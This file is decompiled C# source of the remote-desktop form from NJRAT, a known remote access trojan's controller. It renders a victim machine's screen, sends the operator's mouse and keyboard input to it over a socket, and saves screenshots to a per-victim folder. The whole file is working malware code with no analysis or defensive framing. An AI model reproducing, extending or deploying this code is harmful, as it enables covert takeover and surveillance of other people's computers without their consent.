using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using NJRAT.My.Resources;
using NJRAT.NJRAT;

namespace NJRAT
{
	// Token: 0x02000024 RID: 36
	[DesignerGenerated]
	public partial class sc : Form
	{
		// Token: 0x060004D2 RID: 1234 RVA: 0x00170CE8 File Offset: 0x0016F0E8
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = sc.__ENCList;
			lock (_ENCList)
			{
				bool flag = sc.__ENCList.Count == sc.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = sc.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = sc.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								sc.__ENCList[num] = sc.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					sc.__ENCList.RemoveRange(num, sc.__ENCList.Count - num);
					sc.__ENCList.Capacity = sc.__ENCList.Count;
				}
				sc.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x170001B5 RID: 437
		// (get) Token: 0x060004D5 RID: 1237 RVA: 0x001716E8 File Offset: 0x0016FAE8
		// (set) Token: 0x060004D6 RID: 1238 RVA: 0x00171700 File Offset: 0x0016FB00
		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		// Token: 0x170001B6 RID: 438
		// (get) Token: 0x060004D7 RID: 1239 RVA: 0x0017170C File Offset: 0x0016FB0C
		// (set) Token: 0x060004D8 RID: 1240 RVA: 0x00171724 File Offset: 0x0016FB24
		internal virtual CheckBox CheckBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.CheckBox1_CheckedChanged);
				bool flag = this._CheckBox1 != null;
				if (flag)
				{
					this._CheckBox1.CheckedChanged -= eventHandler;
				}
				this._CheckBox1 = value;
				flag = this._CheckBox1 != null;
				if (flag)
				{
					this._CheckBox1.CheckedChanged += eventHandler;
				}
			}
		}

		// Token: 0x170001B7 RID: 439
		// (get) Token: 0x060004D9 RID: 1241 RVA: 0x00171784 File Offset: 0x0016FB84
		// (set) Token: 0x060004DA RID: 1242 RVA: 0x0017179C File Offset: 0x0016FB9C
		internal virtual CheckBox CheckBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.CheckBox2_CheckedChanged);
				bool flag = this._CheckBox2 != null;
				if (flag)
				{
					this._CheckBox2.CheckedChanged -= eventHandler;
				}
				this._CheckBox2 = value;
				flag = this._CheckBox2 != null;
				if (flag)
				{
					this._CheckBox2.CheckedChanged += eventHandler;
				}
			}
		}

		// Token: 0x170001B8 RID: 440
		// (get) Token: 0x060004DB RID: 1243 RVA: 0x001717FC File Offset: 0x0016FBFC
		// (set) Token: 0x060004DC RID: 1244 RVA: 0x00171814 File Offset: 0x0016FC14
		internal virtual CheckBox CheckBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.CheckBox3_CheckedChanged);
				bool flag = this._CheckBox3 != null;
				if (flag)
				{
					this._CheckBox3.CheckedChanged -= eventHandler;
				}
				this._CheckBox3 = value;
				flag = this._CheckBox3 != null;
				if (flag)
				{
					this._CheckBox3.CheckedChanged += eventHandler;
				}
			}
		}

		// Token: 0x170001B9 RID: 441
		// (get) Token: 0x060004DD RID: 1245 RVA: 0x00171874 File Offset: 0x0016FC74
		// (set) Token: 0x060004DE RID: 1246 RVA: 0x0017188C File Offset: 0x0016FC8C
		internal virtual ComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox1 = value;
			}
		}

		// Token: 0x170001BA RID: 442
		// (get) Token: 0x060004DF RID: 1247 RVA: 0x00171898 File Offset: 0x0016FC98
		// (set) Token: 0x060004E0 RID: 1248 RVA: 0x001718B0 File Offset: 0x0016FCB0
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= eventHandler;
				}
				this._Button1 = value;
				flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click += eventHandler;
				}
			}
		}

		// Token: 0x170001BB RID: 443
		// (get) Token: 0x060004E1 RID: 1249 RVA: 0x00171910 File Offset: 0x0016FD10
		// (set) Token: 0x060004E2 RID: 1250 RVA: 0x00171928 File Offset: 0x0016FD28
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x170001BC RID: 444
		// (get) Token: 0x060004E3 RID: 1251 RVA: 0x00171934 File Offset: 0x0016FD34
		// (set) Token: 0x060004E4 RID: 1252 RVA: 0x0017194C File Offset: 0x0016FD4C
		internal virtual Timer vmethod_16
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_16;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.vmethod_16_Tick);
				bool flag = this._vmethod_16 != null;
				if (flag)
				{
					this._vmethod_16.Tick -= eventHandler;
				}
				this._vmethod_16 = value;
				flag = this._vmethod_16 != null;
				if (flag)
				{
					this._vmethod_16.Tick += eventHandler;
				}
			}
		}

		// Token: 0x170001BD RID: 445
		// (get) Token: 0x060004E5 RID: 1253 RVA: 0x001719AC File Offset: 0x0016FDAC
		// (set) Token: 0x060004E6 RID: 1254 RVA: 0x001719C4 File Offset: 0x0016FDC4
		internal virtual Timer vmethod_12
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_12;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.vmethod_12_Tick);
				bool flag = this._vmethod_12 != null;
				if (flag)
				{
					this._vmethod_12.Tick -= eventHandler;
				}
				this._vmethod_12 = value;
				flag = this._vmethod_12 != null;
				if (flag)
				{
					this._vmethod_12.Tick += eventHandler;
				}
			}
		}

		// Token: 0x170001BE RID: 446
		// (get) Token: 0x060004E7 RID: 1255 RVA: 0x00171A24 File Offset: 0x0016FE24
		// (set) Token: 0x060004E8 RID: 1256 RVA: 0x00171A3C File Offset: 0x0016FE3C
		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		// Token: 0x170001BF RID: 447
		// (get) Token: 0x060004E9 RID: 1257 RVA: 0x00171A48 File Offset: 0x0016FE48
		// (set) Token: 0x060004EA RID: 1258 RVA: 0x00171A60 File Offset: 0x0016FE60
		internal virtual PictureBox p
		{
			[DebuggerNonUserCode]
			get
			{
				return this._p;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.p_Resize);
				PaintEventHandler paintEventHandler = new PaintEventHandler(this.p_Paint);
				MouseEventHandler mouseEventHandler = new MouseEventHandler(this.p_MouseWheel);
				MouseEventHandler mouseEventHandler2 = new MouseEventHandler(this.p_MouseUp);
				MouseEventHandler mouseEventHandler3 = new MouseEventHandler(this.p_MouseMove);
				EventHandler eventHandler2 = new EventHandler(this.p_MouseLeave);
				EventHandler eventHandler3 = new EventHandler(this.p_MouseEnter);
				MouseEventHandler mouseEventHandler4 = new MouseEventHandler(this.p_MouseDown);
				bool flag = this._p != null;
				if (flag)
				{
					this._p.Resize -= eventHandler;
					this._p.Paint -= paintEventHandler;
					this._p.MouseWheel -= mouseEventHandler;
					this._p.MouseUp -= mouseEventHandler2;
					this._p.MouseMove -= mouseEventHandler3;
					this._p.MouseLeave -= eventHandler2;
					this._p.MouseEnter -= eventHandler3;
					this._p.MouseDown -= mouseEventHandler4;
				}
				this._p = value;
				flag = this._p != null;
				if (flag)
				{
					this._p.Resize += eventHandler;
					this._p.Paint += paintEventHandler;
					this._p.MouseWheel += mouseEventHandler;
					this._p.MouseUp += mouseEventHandler2;
					this._p.MouseMove += mouseEventHandler3;
					this._p.MouseLeave += eventHandler2;
					this._p.MouseEnter += eventHandler3;
					this._p.MouseDown += mouseEventHandler4;
				}
			}
		}

		// Token: 0x170001C0 RID: 448
		// (get) Token: 0x060004EB RID: 1259 RVA: 0x00171BE8 File Offset: 0x0016FFE8
		// (set) Token: 0x060004EC RID: 1260 RVA: 0x00171C00 File Offset: 0x00170000
		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button2_Click);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= eventHandler;
				}
				this._Button2 = value;
				flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click += eventHandler;
				}
			}
		}

		// Token: 0x060004ED RID: 1261 RVA: 0x00171C60 File Offset: 0x00170060
		public sc()
		{
			base.FormClosing += this.sc_FormClosing;
			base.Load += this.sc_Load;
			base.ResizeBegin += this.sc_ResizeBegin;
			base.ResizeEnd += this.sc_ResizeEnd;
			sc.__ENCAddToList(this);
			this.QQ = string.Empty;
			this.Oimg = null;
			this.point_0 = default(Point);
			this.point_1 = default(Point);
			this.co = 0;
			this.Folder = string.Empty;
			this.point_2 = new Point(30, 30);
			this.IsActive = false;
			this.fps = 0;
			this.int_0 = 0;
			this.dbf = 0L;
			this.InitializeComponent();
		}

		// Token: 0x060004EE RID: 1262 RVA: 0x00171D40 File Offset: 0x00170140
		public void KDW(object sender, KeyEventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Start", false) == 0;
			if (!flag)
			{
				this.p.Focus();
				flag = this.CheckBox2.Checked;
				if (flag)
				{
					Keys keyCode = e.KeyCode;
					bool flag2;
					if (keyCode != Keys.Shift && keyCode != Keys.ShiftKey)
					{
						if (keyCode != Keys.LShiftKey)
						{
							if (keyCode != Keys.RShiftKey)
							{
								flag2 = false;
								goto IL_71;
							}
						}
					}
					flag2 = true;
					IL_71:
					bool flag3 = flag2;
					if (flag3)
					{
						this.sk.Send(string.Concat(new string[]
						{
							"#",
							Class7.string_1,
							Conversions.ToString(0),
							Class7.string_1,
							Conversions.ToString(16)
						}));
					}
					else
					{
						this.sk.Send(string.Concat(new string[]
						{
							"#",
							Class7.string_1,
							Conversions.ToString(0),
							Class7.string_1,
							Conversions.ToString((int)e.KeyCode)
						}));
					}
				}
				e.SuppressKeyPress = true;
			}
		}

		// Token: 0x060004EF RID: 1263 RVA: 0x00171E68 File Offset: 0x00170268
		public void KUP(object sender, KeyEventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Start", false) == 0;
			if (!flag)
			{
				this.p.Focus();
				flag = this.CheckBox2.Checked;
				if (flag)
				{
					Keys keyCode = e.KeyCode;
					bool flag2;
					if (keyCode != Keys.Shift && keyCode != Keys.ShiftKey)
					{
						if (keyCode != Keys.LShiftKey)
						{
							if (keyCode != Keys.RShiftKey)
							{
								flag2 = false;
								goto IL_71;
							}
						}
					}
					flag2 = true;
					IL_71:
					bool flag3 = flag2;
					if (flag3)
					{
						this.sk.Send(string.Concat(new string[]
						{
							"#",
							Class7.string_1,
							Conversions.ToString(2),
							Class7.string_1,
							Conversions.ToString(16)
						}));
					}
					else
					{
						this.sk.Send(string.Concat(new string[]
						{
							"#",
							Class7.string_1,
							Conversions.ToString(2),
							Class7.string_1,
							Conversions.ToString((int)e.KeyCode)
						}));
					}
				}
				e.SuppressKeyPress = true;
			}
		}

		// Token: 0x060004F0 RID: 1264 RVA: 0x00171F90 File Offset: 0x00170390
		private void p_MouseDown(object sender, MouseEventArgs e)
		{
			PictureBox p = this.p;
			PictureBox pictureBox = p;
			lock (pictureBox)
			{
				bool flag = this.CheckBox1.Checked && Operators.CompareString(this.Button1.Text, "Start", false) != 0;
				if (flag)
				{
					Point point = new Point((int)Math.Round(Math.Round((double)e.X * ((double)this.sz.Width / (double)this.p.Width))), (int)Math.Round(Math.Round((double)e.Y * ((double)this.sz.Height / (double)this.p.Height))));
					flag = e.Button == MouseButtons.Left;
					int num = 0;
					if (flag)
					{
						num = 2;
					}
					flag = e.Button == MouseButtons.Right;
					if (flag)
					{
						num = 8;
					}
					this.sk.Send(string.Concat(new string[]
					{
						"@",
						Class7.string_1,
						Conversions.ToString(point.X),
						Class7.string_1,
						Conversions.ToString(point.Y),
						Class7.string_1,
						Conversions.ToString(num)
					}));
				}
			}
		}

		// Token: 0x060004F1 RID: 1265 RVA: 0x0017210C File Offset: 0x0017050C
		private void p_MouseEnter(object sender, EventArgs e)
		{
			this.IsActive = true;
		}

		// Token: 0x060004F2 RID: 1266 RVA: 0x00172118 File Offset: 0x00170518
		private void p_MouseLeave(object sender, EventArgs e)
		{
			this.IsActive = false;
		}

		// Token: 0x060004F3 RID: 1267 RVA: 0x00172124 File Offset: 0x00170524
		private void p_MouseMove(object sender, MouseEventArgs e)
		{
			this.point_2 = e.Location;
			bool flag = this.point_2.Y < 20;
			if (flag)
			{
				this.Button2.Visible = true;
			}
			else
			{
				this.Button2.Visible = false;
			}
			PictureBox p = this.p;
			PictureBox pictureBox = p;
			lock (pictureBox)
			{
				flag = (!this.p.Focused & this.CheckBox2.Checked) | this.CheckBox1.Checked;
				if (flag)
				{
					this.p.Focus();
				}
			}
		}

		// Token: 0x060004F4 RID: 1268 RVA: 0x001721D4 File Offset: 0x001705D4
		private void p_MouseUp(object sender, MouseEventArgs e)
		{
			bool flag = this.CheckBox1.Checked && Operators.CompareString(this.Button1.Text, "Start", false) != 0;
			if (flag)
			{
				Point point = new Point((int)Math.Round(Math.Round((double)e.X * ((double)this.sz.Width / (double)this.p.Width))), (int)Math.Round(Math.Round((double)e.Y * ((double)this.sz.Height / (double)this.p.Height))));
				flag = e.Button == MouseButtons.Left;
				int num = 0;
				if (flag)
				{
					num = 4;
				}
				flag = e.Button == MouseButtons.Right;
				if (flag)
				{
					num = 16;
				}
				this.sk.Send(string.Concat(new string[]
				{
					"@",
					Class7.string_1,
					Conversions.ToString(point.X),
					Class7.string_1,
					Conversions.ToString(point.Y),
					Class7.string_1,
					Conversions.ToString(num)
				}));
			}
		}

		// Token: 0x060004F5 RID: 1269 RVA: 0x00172308 File Offset: 0x00170708
		private void p_MouseWheel(object sender, MouseEventArgs e)
		{
			PictureBox p = this.p;
			PictureBox pictureBox = p;
			lock (pictureBox)
			{
				bool flag = this.CheckBox1.Checked && Operators.CompareString(this.Button1.Text, "Start", false) != 0;
				if (flag)
				{
					this.sk.Send(string.Concat(new string[]
					{
						"@",
						Class7.string_1,
						Conversions.ToString(e.Delta),
						Class7.string_1,
						Conversions.ToString(this.point_1.Y),
						Class7.string_1,
						Conversions.ToString(2048)
					}));
				}
			}
		}

		// Token: 0x060004F6 RID: 1270 RVA: 0x001723E4 File Offset: 0x001707E4
		private void p_Paint(object sender, PaintEventArgs e)
		{
			string text = Conversions.ToString(this.int_0) + "fps\r\n" + Class6.smethod_17(this.pkt);
			Size size = TextRenderer.MeasureText(text, new Font(this.Font, FontStyle.Bold));
			bool flag = !((this.point_2.X < size.Width) & (this.point_2.Y < size.Height));
			if (flag)
			{
				Rectangle rectangle = new Rectangle(0, 0, size.Width, size.Height);
				e.Graphics.FillRectangle(new Pen(Color.FromArgb(100, 1, 1, 1)).Brush, rectangle);
				Brush brush = Brushes.Red;
				flag = this.int_0 > 3;
				if (flag)
				{
					brush = Brushes.YellowGreen;
				}
				flag = this.int_0 > 6;
				if (flag)
				{
					brush = Brushes.LimeGreen;
				}
				e.Graphics.DrawString(text, new Font(this.Font, FontStyle.Bold), brush, 0f, 0f);
			}
		}

		// Token: 0x060004F7 RID: 1271 RVA: 0x001724EC File Offset: 0x001708EC
		private void p_Resize(object sender, EventArgs e)
		{
			this.Button2.Left = (int)Math.Round(Math.Round((double)this.p.Width / 2.0 - (double)this.Button2.Width / 2.0));
			this.Button2.Top = this.p.Top + 3;
		}

		// Token: 0x060004F8 RID: 1272 RVA: 0x0017255C File Offset: 0x0017095C
		private void Button1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Stop", false) == 0;
			if (flag)
			{
				this.Button1.Text = "Start";
				this.sk.Send("!!");
				this.ComboBox1.Enabled = true;
			}
			else
			{
				this.ComboBox1.Enabled = false;
				this.Button1.Text = "Stop";
				float num = (float)(Conversions.ToDouble(this.ComboBox1.Text.Remove(0, 1)) / 100.0);
				Size size = new Size((int)Math.Round(Math.Round((double)((float)this.sz.Width * num / 10f))) * 10, (int)Math.Round(Math.Round((double)((float)this.sz.Height * num / 10f))) * 10);
				this.sk.Send(string.Concat(new string[]
				{
					"!",
					Class7.string_1,
					this.sk.ip(),
					Class7.string_1,
					Conversions.ToString(size.Width),
					"x",
					Conversions.ToString(size.Height),
					Class7.string_1,
					"0"
				}));
			}
		}

		// Token: 0x060004F9 RID: 1273 RVA: 0x001726CC File Offset: 0x00170ACC
		private void vmethod_16_Tick(object sender, EventArgs e)
		{
			this.vmethod_12.Enabled = false;
			bool flag = !this.osk.CN | !this.sk.CN;
			if (flag)
			{
				this.sk.CN = false;
				this.Panel1.Enabled = false;
				this.Text = "Disconnected!! " + this.QQ;
				this.Close();
			}
			else
			{
				this.int_0 = this.fps;
				this.fps = 0;
				flag = this.int_0 == 0;
				if (flag)
				{
					this.pkt = 0L;
					this.p.Invalidate();
				}
				this.vmethod_12.Enabled = true;
			}
		}

		// Token: 0x060004FA RID: 1274 RVA: 0x00172788 File Offset: 0x00170B88
		private void CheckBox2_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060004FB RID: 1275 RVA: 0x0017278C File Offset: 0x00170B8C
		private void vmethod_12_Tick(object sender, EventArgs e)
		{
			this.ProgressBar1.Value = this.sk.rp();
			Point point = this.PointToClient(Cursor.Position);
			bool flag = (point.X > -1) & (point.Y > -1) & this.IsActive;
			if (flag)
			{
				this.point_0 = new Point((int)Math.Round(Math.Round((double)point.X * ((double)this.sz.Width / (double)this.p.Width))), (int)Math.Round(Math.Round((double)point.Y * ((double)this.sz.Height / (double)this.p.Height))));
				flag = (this.CheckBox1.Checked & (Operators.CompareString(this.Button1.Text, "Start", false) != 0)) && this.point_0 != this.point_1;
				if (flag)
				{
					this.point_1 = this.point_0;
					Client client = this.sk;
					string text = string.Concat(new string[]
					{
						"@",
						Class7.string_1,
						Conversions.ToString(this.point_1.X),
						Class7.string_1,
						Conversions.ToString(this.point_1.Y),
						Class7.string_1,
						Conversions.ToString(1)
					});
					client.SEND_(Class6.smethod_11(ref text));
				}
			}
		}

		// Token: 0x060004FC RID: 1276 RVA: 0x00172918 File Offset: 0x00170D18
		private void sc_FormClosing(object sender, FormClosingEventArgs e)
		{
			bool flag = this.sk != null;
			if (flag)
			{
				this.sk.CN = false;
			}
		}

		// Token: 0x060004FD RID: 1277 RVA: 0x00172944 File Offset: 0x00170D44
		private void sc_Load(object sender, EventArgs e)
		{
			try
			{
				PictureBox p = this.p;
				PictureBox pictureBox = p;
				lock (pictureBox)
				{
					this.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(this.osk.L)));
					this.Text = this.QQ;
					Control p2 = this.p;
					p2.KeyUp += this.KUP;
					p2.KeyDown += this.KDW;
					this.ComboBox1.SelectedIndex = Conversions.ToInteger(Class7.class8_0.string_0);
				}
				this.Folder = this.osk.Folder + "Screen\\";
				bool flag = !Directory.Exists(this.Folder);
				if (flag)
				{
					Directory.CreateDirectory(this.Folder);
				}
				flag = Class7.class8_0.bool_6;
				if (flag)
				{
					this.Button1_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e);
				}
				flag = Operators.CompareString(this.Button1.Text, "Start", false) != 0;
				if (flag)
				{
					this.Button2_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e);
				}
			}
			catch (Exception ex)
			{
				this.Close();
			}
		}

		// Token: 0x060004FE RID: 1278 RVA: 0x00172AD8 File Offset: 0x00170ED8
		private void sc_ResizeBegin(object sender, EventArgs e)
		{
			PictureBox p = this.p;
			PictureBox pictureBox = p;
			lock (pictureBox)
			{
			}
		}

		// Token: 0x060004FF RID: 1279 RVA: 0x00172B14 File Offset: 0x00170F14
		private void sc_ResizeEnd(object sender, EventArgs e)
		{
			PictureBox p = this.p;
			PictureBox pictureBox = p;
			lock (pictureBox)
			{
			}
		}

		// Token: 0x06000500 RID: 1280 RVA: 0x00172B50 File Offset: 0x00170F50
		private void Button2_Click(object sender, EventArgs e)
		{
			bool flag = !this.Panel1.Visible;
			if (flag)
			{
				this.Panel1.Visible = true;
				this.Button2.BackgroundImage = NJRAT_Resources.bullet_arrow_up;
			}
			else
			{
				this.Panel1.Visible = false;
				this.Button2.BackgroundImage = NJRAT_Resources.bullet_arrow_down;
			}
		}

		// Token: 0x06000501 RID: 1281 RVA: 0x00172BB4 File Offset: 0x00170FB4
		private void CheckBox3_CheckedChanged(object sender, EventArgs e)
		{
			bool @checked = this.CheckBox3.Checked;
			if (@checked)
			{
				try
				{
					Process.Start(this.Folder);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000502 RID: 1282 RVA: 0x00172C04 File Offset: 0x00171004
		private void CheckBox1_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x04000239 RID: 569
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x0400023B RID: 571
		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		// Token: 0x0400023C RID: 572
		[AccessedThroughProperty("CheckBox1")]
		private CheckBox _CheckBox1;

		// Token: 0x0400023D RID: 573
		[AccessedThroughProperty("CheckBox2")]
		private CheckBox _CheckBox2;

		// Token: 0x0400023E RID: 574
		[AccessedThroughProperty("CheckBox3")]
		private CheckBox _CheckBox3;

		// Token: 0x0400023F RID: 575
		[AccessedThroughProperty("ComboBox1")]
		private ComboBox _ComboBox1;

		// Token: 0x04000240 RID: 576
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000241 RID: 577
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x04000242 RID: 578
		[AccessedThroughProperty("vmethod_16")]
		private Timer _vmethod_16;

		// Token: 0x04000243 RID: 579
		[AccessedThroughProperty("vmethod_12")]
		private Timer _vmethod_12;

		// Token: 0x04000244 RID: 580
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		// Token: 0x04000245 RID: 581
		[AccessedThroughProperty("p")]
		private PictureBox _p;

		// Token: 0x04000246 RID: 582
		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		// Token: 0x04000247 RID: 583
		public int co;

		// Token: 0x04000248 RID: 584
		public long dbf;

		// Token: 0x04000249 RID: 585
		public string Folder;

		// Token: 0x0400024A RID: 586
		public int fps;

		// Token: 0x0400024B RID: 587
		private int int_0;

		// Token: 0x0400024C RID: 588
		public bool IsActive;

		// Token: 0x0400024D RID: 589
		public Bitmap Oimg;

		// Token: 0x0400024E RID: 590
		public Client osk;

		// Token: 0x0400024F RID: 591
		public long pkt;

		// Token: 0x04000250 RID: 592
		private Point point_0;

		// Token: 0x04000251 RID: 593
		private Point point_1;

		// Token: 0x04000252 RID: 594
		private Point point_2;

		// Token: 0x04000253 RID: 595
		public string QQ;

		// Token: 0x04000254 RID: 596
		public Client sk;

		// Token: 0x04000255 RID: 597
		public Size sz;
	}
}
